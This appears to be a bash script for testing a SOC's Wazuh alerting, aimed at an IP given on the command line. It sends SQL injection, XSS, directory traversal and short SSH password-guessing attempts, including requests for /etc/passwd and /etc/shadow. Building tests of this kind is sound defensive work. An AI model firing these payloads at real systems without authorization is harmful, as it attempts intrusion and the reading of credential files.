#!/bin/bash

# Configuration
TARGET_IP=$1
if [ -z "$TARGET_IP" ]; then
    echo "Usage: ./attack_simulation.sh <TARGET_IP>"
    exit 1
fi

echo "--- SOC Attack Simulation Starting on $TARGET_IP ---"

# 1. SQL Injection (OWASP A03:2021-Injection)
echo "[!] Simulating SQL Injection..."
curl -s -X GET "http://$TARGET_IP/login.php?user=admin'--&pass=anything" > /dev/null
curl -s -X GET "http://$TARGET_IP/products.php?id=1' UNION SELECT 1,2,3,4--" > /dev/null

# 2. Cross-Site Scripting (OWASP A03:2021-Injection)
echo "[!] Simulating XSS..."
curl -s -X POST "http://$TARGET_IP/comment.php" -d "text=<script>alert('XSS')</script>" > /dev/null

# 3. Directory Traversal (OWASP A01:2021-Broken Access Control)
echo "[!] Simulating Directory Traversal..."
curl -s "http://$TARGET_IP/../../../../etc/passwd" > /dev/null
curl -s "http://$TARGET_IP/index.php?page=../../../../etc/shadow" > /dev/null

# 4. SSH Brute Force (OWASP A07:2021-Identification and Authentication Failures)
# We can use hydra if installed, or just simple ssh loop
echo "[!] Simulating SSH Brute Force (5 attempts)..."
for i in {1..5}; do
    sshpass -p "wrongpassword" ssh admin@$TARGET_IP -o StrictHostKeyChecking=no -o ConnectTimeout=1 "exit" 2>/dev/null
done

echo "--- Simulation Complete. Check Wazuh Dashboard for alerts. ---"
